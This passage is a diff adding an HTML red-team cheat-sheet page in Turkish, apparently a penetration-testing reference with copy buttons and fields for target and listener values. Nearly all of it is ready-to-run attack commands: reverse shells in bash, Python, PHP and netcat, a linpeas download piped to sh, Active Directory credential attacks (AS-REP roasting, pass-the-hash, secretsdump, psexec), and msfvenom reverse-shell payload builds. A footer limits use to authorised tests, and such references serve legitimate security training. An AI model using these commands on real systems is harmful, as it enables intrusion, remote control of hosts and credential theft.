+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+          </div>
+        </div>
+
+        <div id="privesc-windows">
+          <h3 class="text-lg font-semibold text-gray-300 mb-4">Windows</h3>
+          <div class="grid gap-6 md:grid-cols-2">
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="systeminfo" data-search="systeminfo windows">
+              <h4 class="font-semibold text-white mb-2">Sistem Bilgisi</h4>
+              <p class="text-sm text-gray-400 mb-4">OS, patch seviyesi.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="systeminfo"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="net" data-search="net user admin">
+              <h4 class="font-semibold text-white mb-2">Kullanıcı / Admin Listesi</h4>
+              <p class="text-sm text-gray-400 mb-4">Yerel kullanıcılar ve adminler.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="net user &amp;&amp; net localgroup administrators"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="winpeas" data-search="winpeas windows">
+              <h4 class="font-semibold text-white mb-2">WinPEAS</h4>
+              <p class="text-sm text-gray-400 mb-4">Windows privilege escalation taraması.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="winpeas.exe"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+          </div>
+        </div>
+      </section>
+
+      <!-- REVERSE SHELL -->
+      <section id="revshell" class="mb-16">
+        <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-2">
+          <span class="w-1 h-8 bg-[#ff0000] rounded"></span> Reverse Shell
+        </h2>
+        
+        <div id="revshell-bash" class="mb-10">
+          <h3 class="text-lg font-semibold text-gray-300 mb-4">Bash / Sh</h3>
+          <div class="grid gap-6 md:grid-cols-2">
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="bash" data-search="bash reverse shell">
+              <h4 class="font-semibold text-white mb-2">Bash Reverse Shell</h4>
+              <p class="text-sm text-gray-400 mb-4">TCP /dev/tcp ile bağlantı.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="bash -i >&amp; /dev/tcp/[LHOST]/[LPORT] 0>&amp;1"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+          </div>
+        </div>
+
+        <div id="revshell-script" class="mb-10">
+          <h3 class="text-lg font-semibold text-gray-300 mb-4">Python / PHP</h3>
+          <div class="grid gap-6 md:grid-cols-2">
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="python" data-search="python reverse shell">
+              <h4 class="font-semibold text-white mb-2">Python Reverse Shell</h4>
+              <p class="text-sm text-gray-400 mb-4">Socket tabanlı.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"[LHOST]\",[LPORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="php" data-search="php reverse shell">
+              <h4 class="font-semibold text-white mb-2">PHP Reverse Shell</h4>
+              <p class="text-sm text-gray-400 mb-4">fsockopen ile.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="php -r '$sock=fsockopen(\"[LHOST]\",[LPORT]);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+          </div>
+        </div>
+
+        <div id="revshell-nc">
+          <h3 class="text-lg font-semibold text-gray-300 mb-4">Netcat</h3>
+          <div class="grid gap-6 md:grid-cols-2">
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="nc" data-search="nc reverse shell -e">
+              <h4 class="font-semibold text-white mb-2">NC – -e ile</h4>
+              <p class="text-sm text-gray-400 mb-4">-e destekleyen nc.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="nc -e /bin/sh [LHOST] [LPORT]"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="nc" data-search="nc mkfifo named pipe">
+              <h4 class="font-semibold text-white mb-2">NC – mkfifo (-e yok)</h4>
+              <p class="text-sm text-gray-400 mb-4">Named pipe ile evrensel.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&amp;1|nc [LHOST] [LPORT] >/tmp/f"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="nc" data-search="nc dinleyici listener">
+              <h4 class="font-semibold text-white mb-2">Dinleyici (Saldırgan)</h4>
+              <p class="text-sm text-gray-400 mb-4">Tüm payload'lar için listener.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="nc -lvnp [LPORT]"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+          </div>
+        </div>
+      </section>
+
+      <!-- ACTIVE DIRECTORY -->
+      <section id="ad" class="mb-16">
+        <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-2">
+          <span class="w-1 h-8 bg-[#ff0000] rounded"></span> Active Directory
+        </h2>
+        
+        <div id="ad-bloodhound" class="mb-10">
+          <h3 class="text-lg font-semibold text-gray-300 mb-4">BloodHound</h3>
+          <div class="grid gap-6 md:grid-cols-2">
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="bloodhound" data-search="bloodhound ingestor">
+              <h4 class="font-semibold text-white mb-2">BloodHound Python Ingestor</h4>
+              <p class="text-sm text-gray-400 mb-4">AD verisi toplama.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="bloodhound-python -u kullanici -p sifre -d [HEDEF] -c All -ns [HEDEF]"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+          </div>
+        </div>
+
+        <div id="ad-impacket" class="mb-10">
+          <h3 class="text-lg font-semibold text-gray-300 mb-4">Impacket</h3>
+          <div class="grid gap-6 md:grid-cols-2">
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="impacket" data-search="GetNPUsers kerberos ASREPRoast">
+              <h4 class="font-semibold text-white mb-2">GetNPUsers – AS-REP Roasting</h4>
+              <p class="text-sm text-gray-400 mb-4">Preauth kapalı kullanıcı hash'leri.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="impacket-GetNPUsers [HEDEF]/ -usersfile users.txt -dc-ip [HEDEF] -no-pass"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="impacket" data-search="psexec remote command">
+              <h4 class="font-semibold text-white mb-2">PsExec</h4>
+              <p class="text-sm text-gray-400 mb-4">Uzak komut çalıştırma.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="impacket-psexec DOMAIN/kullanici@[HEDEF] -hashes :NTLM_HASH"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="impacket" data-search="secretsdump hash">
+              <h4 class="font-semibold text-white mb-2">Secretsdump</h4>
+              <p class="text-sm text-gray-400 mb-4">SAM/LSA hash dökümü.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="impacket-secretsdump DOMAIN/kullanici@[HEDEF]"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="impacket" data-search="wmiexec">
+              <h4 class="font-semibold text-white mb-2">WMIexec</h4>
+              <p class="text-sm text-gray-400 mb-4">WMI ile komut çalıştırma.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="impacket-wmiexec DOMAIN/kullanici:sifre@[HEDEF]"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+          </div>
+        </div>
+
+        <div id="ad-cme">
+          <h3 class="text-lg font-semibold text-gray-300 mb-4">CrackMapExec</h3>
+          <div class="grid gap-6 md:grid-cols-2">
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="crackmapexec" data-search="crackmapexec pass the hash">
+              <h4 class="font-semibold text-white mb-2">SMB Pass-the-Hash</h4>
+              <p class="text-sm text-gray-400 mb-4">NTLM hash ile komut çalıştır.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="crackmapexec smb [HEDEF] -u kullanici -H NTLM_HASH -x 'whoami'"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+          </div>
+        </div>
+      </section>
+
+      <!-- EXPLOIT -->
+      <section id="exploit" class="mb-16">
+        <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-2">
+          <span class="w-1 h-8 bg-[#ff0000] rounded"></span> Exploit
+        </h2>
+        
+        <div id="exploit-msf">
+          <h3 class="text-lg font-semibold text-gray-300 mb-4">Metasploit</h3>
+          <div class="grid gap-6 md:grid-cols-2">
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="msfconsole" data-search="metasploit msfconsole">
+              <h4 class="font-semibold text-white mb-2">MSFconsole Başlat</h4>
+              <p class="text-sm text-gray-400 mb-4">Metasploit Framework.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="msfconsole"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="msfconsole" data-search="metasploit search use exploit">
+              <h4 class="font-semibold text-white mb-2">Modül Kullanımı</h4>
+              <p class="text-sm text-gray-400 mb-4">Arama ve exploit çalıştırma.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="search servis_adi; use modul_yolu; set RHOSTS [HEDEF]; set LHOST [LHOST]; exploit"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="msfvenom" data-search="msfvenom payload reverse shell">
+              <h4 class="font-semibold text-white mb-2">MSFvenom – Linux Reverse Shell</h4>
+              <p class="text-sm text-gray-400 mb-4">ELF payload oluştur.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[LHOST] LPORT=[LPORT] -f elf -o shell.elf"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="msfvenom" data-search="msfvenom windows">
+              <h4 class="font-semibold text-white mb-2">MSFvenom – Windows Reverse Shell</h4>
+              <p class="text-sm text-gray-400 mb-4">EXE payload oluştur.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[LHOST] LPORT=[LPORT] -f exe -o shell.exe"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+          </div>
+        </div>
+      </section>
+
+    </main>
+  </div>
+
+  <!-- Mobil Hızlı Geçiş -->
+  <nav class="lg:hidden fixed bottom-0 left-0 right-0 bg-[#161616] border-t border-[#262626] p-2 flex overflow-x-auto gap-2 z-40">
+    <a href="#kesif" class="px-3 py-2 text-xs whitespace-nowrap rounded bg-[#262626]">Keşif</a>
+    <a href="#web" class="px-3 py-2 text-xs whitespace-nowrap rounded bg-[#262626]">Web</a>
+    <a href="#network" class="px-3 py-2 text-xs whitespace-nowrap rounded bg-[#262626]">Network</a>
+    <a href="#privesc" class="px-3 py-2 text-xs whitespace-nowrap rounded bg-[#262626]">PrivEsc</a>
+    <a href="#revshell" class="px-3 py-2 text-xs whitespace-nowrap rounded bg-[#262626]">RevShell</a>
+    <a href="#ad" class="px-3 py-2 text-xs whitespace-nowrap rounded bg-[#262626]">AD</a>
+    <a href="#exploit" class="px-3 py-2 text-xs whitespace-nowrap rounded bg-[#262626]">Exploit</a>
+  </nav>
+
+  <footer class="text-center py-6 text-gray-500 text-sm border-t border-[#262626] mt-8">
+    <p>Red Team El Kitabı — Sadece yetkili penetrasyon testleri için kullanın.</p>
+    <p class="mt-2 text-[#ff0000] font-medium">Fevzi Ege Yurtsevenler · AltaySec</p>
+  </footer>
+
+  <script>
+    const vars = { '[HEDEF]': () => document.getElementById('var-target').value || '[HEDEF]', '[LHOST]': () => document.getElementById('var-lhost').value || '[LHOST]', '[LPORT]': () => document.getElementById('var-lport').value || '[LPORT]' };
+
+    const toolColors = {
+      nmap:'#00ff88', subfinder:'#00d4ff', whois:'#a78bfa', dig:'#a78bfa', masscan:'#34d399',
+      gobuster:'#f59e0b', ffuf:'#f59e0b', feroxbuster:'#fbbf24', sqlmap:'#22c55e', nikto:'#ef4444', nuclei:'#f43f5e',
+      nc:'#3b82f6', smbclient:'#8b5cf6', snmpwalk:'#06b6d4', crackmapexec:'#ec4899', hydra:'#f97316',
+      sudo:'#eab308', find:'#eab308', linpeas:'#10b981', systeminfo:'#6366f1', net:'#6366f1', winpeas:'#10b981',
+      bash:'#14b8a6', python:'#f97316', php:'#8b5cf6', bloodhound:'#dc2626', impacket:'#7c3aed',
+      msfconsole:'#be185d', msfvenom:'#be185d', curl:'#10b981', amass:'#00d4ff'
+    };
+
+    function getToolName(cmd) {
+      const m = (cmd || '').match(/^([a-z0-9_-]+)/i);
+      return m ? m[1].toLowerCase() : '';
+    }
+    function getToolColor(tool) {
+      if (toolColors[tool]) return toolColors[tool];
+      const base = tool.split('-')[0];
+      return toolColors[base] || toolColors[base.replace(/\d+$/, '')] || '#e5e5e5';
+    }
+
+    function updateAllCommands() {
+      document.querySelectorAll('.cmd-text').forEach(el => {
+        let text = el.getAttribute('data-original') || el.textContent;
+        if (!el.getAttribute('data-original')) el.setAttribute('data-original', text);
+        Object.keys(vars).forEach(k => { text = text.replaceAll(k, vars[k]()); });
+        const tool = getToolName(text);
+        const color = getToolColor(tool);
+        const firstSpace = text.indexOf(' ');
+        const firstPart = firstSpace > 0 ? text.slice(0, firstSpace) : text;
+        const rest = firstSpace > 0 ? text.slice(firstSpace) : '';
+        el.innerHTML = '<span class="tool-name" style="color:' + color + '">' + escapeHtml(firstPart) + '</span>' + escapeHtml(rest);
+      });
+    }
+
+    function escapeHtml(s) {
+      const d = document.createElement('div');
+      d.textContent = s;
+      return d.innerHTML;
+    }
+
+    document.getElementById('var-target').addEventListener('input', updateAllCommands);
+    document.getElementById('var-lhost').addEventListener('input', updateAllCommands);
+    document.getElementById('var-lport').addEventListener('input', updateAllCommands);
+
+    function copyCmd(btn) {
+      const code = btn.closest('article').querySelector('.cmd-text');
+      const text = code.textContent.replace(/&amp;/g, '&').replace(/&lt;/g, '<').replace(/&gt;/g, '>');
+      navigator.clipboard.writeText(text).then(() => {
+        const orig = btn.textContent;
+        btn.textContent = 'Kopyalandı!';
+        btn.classList.add('text-[#ff0000]');
+        setTimeout(() => { btn.textContent = orig; btn.classList.remove('text-[#ff0000]'); }, 1500);
+      });
+    }
+
+    document.querySelectorAll('.cmd-text').forEach(el => { if (!el.getAttribute('data-original')) el.setAttribute('data-original', el.textContent); });
+    updateAllCommands();
+
+    document.getElementById('search-input').addEventListener('input', function() {
+      const q = this.value.toLowerCase().trim();
+      document.querySelectorAll('.cmd-card').forEach(card => {
+        const search = (card.getAttribute('data-search') || '').toLowerCase();
+        const title = (card.querySelector('h4')?.textContent || '').toLowerCase();
+        const desc = (card.querySelector('p')?.textContent || '').toLowerCase();
+        const cmd = (card.querySelector('.cmd-text')?.getAttribute('data-original') || '').toLowerCase();
+        const match = !q || search.includes(q) || title.includes(q) || desc.includes(q) || cmd.includes(q);
+        card.style.display = match ? '' : 'none';
+        card.closest('.grid')?.querySelectorAll('.cmd-card').forEach(c => {});
+      });
+      document.querySelectorAll('section').forEach(sec => {
+        const visible = sec.querySelectorAll('.cmd-card:not([style*="none"])').length;
+        sec.style.display = visible ? '' : 'none';
+      });
+    });
+  </script>
+</body>
+</html>
